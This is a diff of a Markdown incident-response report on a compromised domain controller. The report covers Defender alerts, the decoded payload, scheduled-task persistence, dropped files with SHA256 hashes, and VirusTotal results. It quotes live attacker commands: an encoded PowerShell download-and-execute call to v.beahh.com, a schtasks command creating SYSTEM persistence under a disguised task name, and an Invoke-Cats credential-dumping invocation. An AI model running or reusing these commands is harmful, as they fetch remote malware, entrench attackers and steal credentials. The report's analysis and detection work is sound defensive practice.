@@ -29,6 +29,8 @@ Microsoft Defender generated an alert for:
 
 Initial review showed recurring executions of:
 
+![cyberchef](images/cyberchef.png)
+
 ```"
 powershell.EXE" -ep bypass -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdgAuAGIAZQBhAGgAaAAuAGMAbwBtAC8AdgAnACsAJABlAG4AdgA6AFUAUwBFAFIARABPAE0AQQBJAE4AKQA=
 ```
@@ -40,17 +42,19 @@ The command was observed repeatedly across multiple days, strongly indicating au
 
 Advanced Hunting queries identified recurring PowerShell executions approximately every 50 minutes, tied to the Domain Controller and running under the SYSTEM account.
 
+![cyberchef](images/alert-powershell-command.png)
+
 This strongly suggested an automated persistence mechanism operating with elevated privileges.
 
 #### Key Findings
 
-Executed as SYSTEM
+- **Executed as SYSTEM**
 
-Repeated on a fixed interval
+- **Repeated on a fixed interval**
 
-Encoded command line
+- **Encoded command line**
 
-Same host across all executions
+- **Same host across all executions**
 
 ### 2. Payload Decoding
 
@@ -67,15 +71,17 @@ $env:USERDOMAIN appends the Active Directory domain name to the request
 
 This behavior is consistent with:
 
-Fileless malware
+- **Fileless malware**
 
-Command-and-control staging
+- **Command-and-control staging**
 
-Remote tasking
+- **Remote tasking**
 
-In-memory payload delivery
+- **In-memory payload delivery**
 
-No other devices are affected by this powershell command
+Based on the available telemtry we do not see this powershell command to be ran on other devices
+
+![cyberchef](images/other-hosts.png)
 
 ### 3. Root Cause – Scheduled Task Persistence
 
@@ -85,17 +91,19 @@ Further investigation identified the malicious task creation command:
 schtasks /create /ru system /sc MINUTE /mo 50 /tn "\Microsoft\windows\Bluetooths" /tr "powershell -ep bypass -e <payload>"
 ```
 
+![cyberchef](images/sheduled-task-creation.png)
+
 #### Why This Matters
 
-Runs as SYSTEM
+- **Runs as SYSTEM**
 
-Executes every 50 minutes
+- **Executes every 50 minutes**
 
-Uses a deceptive Microsoft-style task name
+- **Uses a deceptive Microsoft-style task name**
 
-Launches encoded PowerShell payload
+- **Launches encoded PowerShell payload**
 
-Provides recurring privileged execution
+- **Provides recurring privileged execution**
 
 This explains the repeated Defender detections over multiple days.
 
@@ -108,17 +116,19 @@ v.beahh.com
 
 Although the logged remote IP resolved as 127.0.0.1, this likely reflects local proxying, inspection, or telemetry redirection rather than the true external destination.
 
+![cyberchef](images/outbound-connections.png)
+
 The stronger indicator is the repeated association between the encoded PowerShell process and the suspicious domain.
 
 This behavior is consistent with:
 
-Payload retrieval
+- **Payload retrieval**
 
-Command-and-control check-ins
+- **Command-and-control check-ins**
 
-Remote tasking
+- **Remote tasking**
 
-Staged malware delivery
+- **Staged malware delivery**
 
 ### 5. Dropped Payloads and File Artifacts
 
@@ -135,17 +145,23 @@ Confirmed Files
 | Apr 16 05:09 | Renamed  | `svchost.exe` | `C:\Windows\SysWOW64\drivers\svchost.exe` |
 
 
+![cyberchef](images/dropped-malware.png)
+
+
 Why This Matters
-Legitimate svchost.exe should reside in System32
-Execution from Temp directories strongly suggests masquerading
-m.ps1 aligns with later credential-related PowerShell activity
-Indicates transition from fileless execution to dropped tooling
+
+- **Legitimate svchost.exe should reside in System32**
+- **Execution from Temp directories strongly suggests masquerading**
+- **m.ps1 aligns with later credential-related PowerShell activity**
+- **Indicates transition from fileless execution to dropped tooling**
 
 ### 6. Additional Suspicious Activity
 
 Further PowerShell commands were identified during the same timeframe.
 
-Credential-Related Activity:
+![cyberchef](images/powershell-commands.png)
+
+- **Credential-Related Activity**
 
 ```
 powershell.exe -exec bypass "import-module c:\windows\temp\m.ps1;Invoke-Cats -pwds"
@@ -153,7 +169,7 @@ powershell.exe -exec bypass "import-module c:\windows\temp\m.ps1;Invoke-Cats -pw
 
 This likely indicates use of a custom toolkit for password discovery, credential access, or local enumeration.
 
-Security Log Enumeration:
+- **Security Log Enumeration**
 
 ```
 powershell -ep bypass -nop -c "(Get-EventLog -LogName 'Security' -After (get-date).AddDays(-7) -befor (get-date).AddDays(-3)).length"
@@ -171,11 +187,11 @@ This suggests attacker reconnaissance, log awareness, or attempts to understand 
 
 #### Files:
 
-| File Name   | SHA256                                                             | Path                                      | 
-| ----------- | ------------------------------------------------------------------ | ----------------------------------------- |
-| svchost.exe | `60b6d7664598e6a988d9389e6359838be966dfa54859d5cb1453cbc9b126ed7d` | `C:\Windows\Temp\svchost.exe`             |
-| m.ps1       | `d943bc6dc7614894cc1c741c6c18ac2dbd2c5069f3ab9bc9def5cc2661e54dee` | `C:\Windows\Temp\m.ps1`                   |
-| svchost.exe | `bdbfa96d17c2f06f68b3bcc84568cf445915e194f130b0dc2411805cf889b6cc` | `C:\Windows\SysWOW64\drivers\svchost.exe` |
+| File Name | SHA256 | Path | Malware Family |
+|-----------|--------|------|----------------|
+| svchost.exe | `60b6d7664598e6a988d9389e6359838be966dfa54859d5cb1453cbc9b126ed7d` | `C:\Windows\Temp\svchost.exe` | Trickster, Python, Mimikatz |
+| m.ps1 | `d943bc6dc7614894cc1c741c6c18ac2dbd2c5069f3ab9bc9def5cc2661e54dee` | `C:\Windows\Temp\m.ps1` | PowerShell, Mimikatz, DWJ |
+| svchost.exe | `bdbfa96d17c2f06f68b3bcc84568cf445915e194f130b0dc2411805cf889b6cc` | `C:\Windows\SysWOW64\drivers\svchost.exe` | Fsysna, ADZPF, DangerousSig |
 
 #### Persistence Artifact
 
@@ -205,3 +221,32 @@ This investigation confirmed that the Defender alert was part of a broader compr
 An attacker established SYSTEM-level persistence through a malicious scheduled task, repeatedly executed remote in-memory payloads, dropped additional tools to disk, and performed follow-on activity consistent with credential access and reconnaissance.
 
 The case highlights the importance of validating alerts beyond the initial detection and demonstrates how recurring PowerShell telemetry can reveal deeper persistence and attacker intent.
+
+## OSINT Enrichment
+
+### VirusTotal – Malicious File Reputation (`svchost.exe`)
+
+The dropped file `svchost.exe` located in `C:\Windows\Temp\svchost.exe` was analyzed in VirusTotal and received **55 detections out of 69 security vendors**, strongly confirming the file is malicious.
+
+![VirusTotal svchost.exe](images/virustotal-svchost.png)
+
+### Key Findings
+
+- **Community score:** 55 / 69
+- **Threat Category:** Trojan
+- **Popular Threat Label:** `trojan.trickster/python`
+- **Family Labels:** Trickster, Python, Mimikatz
+- **Behavior Tags Observed:**
+  - persistence
+  - service-scan
+  - checks-user-input
+  - detect-debug-environment
+  - runtime-modules
+  - WMI usage
+
+### Verdict
+
+This external intelligence validates the internal findings from Microsoft Defender hunting.  
+The file is highly suspicious and likely designed for persistence, credential abuse, or post-exploitation activity.
+
+
